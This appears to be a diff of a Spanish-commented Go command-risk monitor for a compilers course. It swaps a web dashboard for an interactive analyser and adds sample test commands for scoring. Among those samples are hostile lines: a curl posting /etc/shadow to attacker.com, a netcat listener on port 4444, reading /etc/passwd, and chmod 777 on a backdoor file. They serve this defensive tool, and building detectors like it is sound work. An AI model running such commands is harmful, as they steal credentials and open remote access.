@@ -1,38 +1,23 @@
 package main
 
 import (
-	"encoding/json"
+	"bufio"
 	"fmt"
 	"log"
-	"net/http"
+	"os"
 	"strings"
 	"time"
 
 	"security-monitor/internal/lexer"
-	"security-monitor/internal/models"
 	"security-monitor/internal/parser"
 	"security-monitor/internal/semantic"
+	"security-monitor/internal/models"
 )
 
 type SecurityMonitor struct {
 	lexer    *lexer.Lexer
 	parser   *parser.Parser
 	semantic *semantic.Analyzer
-	alerts   []models.AnalysisResult
-}
-
-type WebResponse struct {
-	Success bool        `json:"success"`
-	Data    interface{} `json:"data,omitempty"`
-	Error   string      `json:"error,omitempty"`
-}
-
-type DashboardData struct {
-	TotalCommands    int                     `json:"total_commands"`
-	HighRiskCommands int                     `json:"high_risk_commands"`
-	RecentAlerts     []models.AnalysisResult `json:"recent_alerts"`
-	RiskDistribution map[string]int          `json:"risk_distribution"`
-	LastUpdate       string                  `json:"last_update"`
 }
 
 func NewSecurityMonitor() *SecurityMonitor {
@@ -40,7 +25,6 @@ func NewSecurityMonitor() *SecurityMonitor {
 		lexer:    lexer.New(),
 		parser:   parser.New(),
 		semantic: semantic.New(),
-		alerts:   make([]models.AnalysisResult, 0),
 	}
 }
 
@@ -63,136 +47,124 @@ func (sm *SecurityMonitor) ProcessCommand(command string, user string, timestamp
 		return nil, fmt.Errorf("error en análisis semántico: %w", err)
 	}
 
-	result.Tokens = tokens
-
-	// Almacenar resultado para el dashboard
-	sm.alerts = append(sm.alerts, *result)
-	
-	// Mantener solo los últimos 100 resultados
-	if len(sm.alerts) > 100 {
-		sm.alerts = sm.alerts[1:]
-	}
-
 	return result, nil
 }
 
-func (sm *SecurityMonitor) analyzeHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
-
-	var request struct {
-		Command string `json:"command"`
-		User    string `json:"user"`
-	}
-
-	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
-		response := WebResponse{
-			Success: false,
-			Error:   "Invalid JSON format",
+func (sm *SecurityMonitor) MonitorCommands(commandChan <-chan models.CommandInput) {
+	for cmd := range commandChan {
+		result, err := sm.ProcessCommand(cmd.Command, cmd.User, cmd.Timestamp)
+		if err != nil {
+			log.Printf("Error procesando comando: %v", err)
+			continue
 		}
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(response)
-		return
-	}
 
-	if strings.TrimSpace(request.Command) == "" {
-		response := WebResponse{
-			Success: false,
-			Error:   "Command cannot be empty",
+		if result.RiskScore >= models.HighRiskScore {
+			sm.handleHighRiskAlert(result)
 		}
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(response)
-		return
-	}
 
-	result, err := sm.ProcessCommand(request.Command, request.User, time.Now())
-	if err != nil {
-		response := WebResponse{
-			Success: false,
-			Error:   err.Error(),
-		}
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(response)
-		return
+		sm.logResult(result)
 	}
-
-	response := WebResponse{
-		Success: true,
-		Data:    result,
-	}
-
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(response)
 }
 
-func (sm *SecurityMonitor) dashboardHandler(w http.ResponseWriter, r *http.Request) {
-	riskDistribution := make(map[string]int)
-	highRiskCount := 0
-	
-	for _, alert := range sm.alerts {
-		riskDistribution[string(alert.RiskLevel)]++
-		if alert.RiskScore >= models.HighRiskScore {
-			highRiskCount++
-		}
+func (sm *SecurityMonitor) handleHighRiskAlert(result *models.AnalysisResult) {
+	fmt.Printf("🚨 ALERTA DE ALTA PRIORIDAD 🚨\n")
+	fmt.Printf("Usuario: %s\n", result.User)
+	fmt.Printf("Comando: %s\n", result.OriginalCommand)
+	fmt.Printf("Nivel de Riesgo: %s\n", result.RiskLevel)
+	fmt.Printf("Puntuación: %.2f\n", result.RiskScore)
+	fmt.Printf("Razones: %v\n", result.Reasons)
+	fmt.Printf("Timestamp: %s\n", result.Timestamp.Format(time.RFC3339))
+	fmt.Println(strings.Repeat("-", 50))
+}
+
+func (sm *SecurityMonitor) logResult(result *models.AnalysisResult) {
+	if result.RiskScore > models.LowRiskScore {
+		log.Printf("Usuario: %s | Comando: %s | Riesgo: %s (%.2f)",
+			result.User, result.OriginalCommand, result.RiskLevel, result.RiskScore)
 	}
-
-	// Obtener las últimas 10 alertas
-	recentAlerts := sm.alerts
-	if len(recentAlerts) > 10 {
-		recentAlerts = recentAlerts[len(recentAlerts)-10:]
-	}
-
-	dashboardData := DashboardData{
-		TotalCommands:    len(sm.alerts),
-		HighRiskCommands: highRiskCount,
-		RecentAlerts:     recentAlerts,
-		RiskDistribution: riskDistribution,
-		LastUpdate:       time.Now().Format("15:04:05"),
-	}
-
-	// Log para depuración
-	fmt.Printf("Dashboard Data: Total=%d, HighRisk=%d, Alerts=%d\n", 
-		dashboardData.TotalCommands, 
-		dashboardData.HighRiskCommands, 
-		len(dashboardData.RecentAlerts))
-
-	response := WebResponse{
-		Success: true,
-		Data:    dashboardData,
-	}
-
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(response)
 }
 
 func main() {
+	fmt.Println("🔍 Sistema de Monitoreo de Seguridad - Compiladores")
+	fmt.Println("Iniciando análisis de comandos...")
+
 	monitor := NewSecurityMonitor()
-
-	// Servir archivos estáticos desde la carpeta web/
-	fs := http.FileServer(http.Dir("./web/"))
-	http.Handle("/static/", http.StripPrefix("/static/", fs))
 	
-	// Servir index.html en la ruta raíz
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path == "/" {
-			http.ServeFile(w, r, "./web/index.html")
-		} else {
-			// Intentar servir el archivo desde web/
-			http.ServeFile(w, r, "./web"+r.URL.Path)
+	// Interfaz interactiva mejorada
+	scanner := bufio.NewScanner(os.Stdin)
+	fmt.Println("\nIngresa comandos para analizar (escribe 'exit' para salir):")
+
+	for {
+		fmt.Print("> ")
+		if !scanner.Scan() {
+			break
 		}
-	})
 
-	// API endpoints
-	http.HandleFunc("/api/analyze", monitor.analyzeHandler)
-	http.HandleFunc("/api/dashboard", monitor.dashboardHandler)
+		input := strings.TrimSpace(scanner.Text())
+		if input == "exit" {
+			break
+		}
 
-	fmt.Println("🔍 Security Monitor Web Server")
-	fmt.Println("🌐 Servidor iniciado en: http://localhost:8080")
-	fmt.Println("📊 Dashboard disponible en: http://localhost:8080")
-	fmt.Println("🛡️ Sistema de monitoreo activo...")
-	fmt.Println("📁 Asegúrate de que la carpeta 'web/' exista con los archivos HTML, CSS y JS")
+		if input == "" {
+			continue
+		}
 
-	log.Fatal(http.ListenAndServe(":8080", nil))
+		// Procesar comando en tiempo real
+		result, err := monitor.ProcessCommand(input, "usuario_test", time.Now())
+		if err != nil {
+			fmt.Printf("❌ Error: %v\n", err)
+			continue
+		}
+
+		// Mostrar resultado con formato mejorado
+		fmt.Printf("\n📊 Análisis completado:\n")
+		fmt.Printf("  🎯 Comando: %s\n", result.OriginalCommand)
+		fmt.Printf("  👤 Usuario: %s\n", result.User)
+		fmt.Printf("  ⚠️  Nivel de Riesgo: %s\n", result.RiskLevel)
+		fmt.Printf("  📈 Puntuación: %.2f\n", result.RiskScore)
+		
+		if len(result.ThreatCategories) > 0 {
+			fmt.Printf("  🚨 Categorías de Amenaza: %v\n", result.ThreatCategories)
+		}
+		
+		if len(result.Reasons) > 0 {
+			fmt.Printf("  💡 Razones: %v\n", result.Reasons)
+		}
+		
+		if len(result.Recommendations) > 0 {
+			fmt.Printf("  🔧 Recomendaciones: %v\n", result.Recommendations)
+		}
+		
+		if result.IsBlocked {
+			fmt.Printf("  🚫 COMANDO BLOQUEADO\n")
+		}
+		
+		fmt.Printf("  ⏱️  Tiempo de procesamiento: %v\n", result.ProcessingTime)
+		fmt.Println()
+	}
+
+	fmt.Println("Sistema de monitoreo detenido.")
+}
+
+func simulateCommandInput(commandChan chan<- models.CommandInput) {
+	// Comandos de ejemplo para demostración
+	testCommands := []string{
+		"ls -la /home",
+		"sudo cat /etc/passwd",
+		"find / -name '*.ssh' 2>/dev/null",
+		"nc -l -p 4444",
+		"chmod 777 /tmp/backdoor",
+		"curl -X POST https://attacker.com/exfil -d @/etc/shadow",
+		"whoami && id && uname -a",
+		"ps aux | grep ssh",
+	}
+
+	for i, cmd := range testCommands {
+		time.Sleep(2 * time.Second)
+		commandChan <- models.CommandInput{
+			Command:   cmd,
+			User:      fmt.Sprintf("user%d", i%3),
+			Timestamp: time.Now(),
+		}
+	}
 }
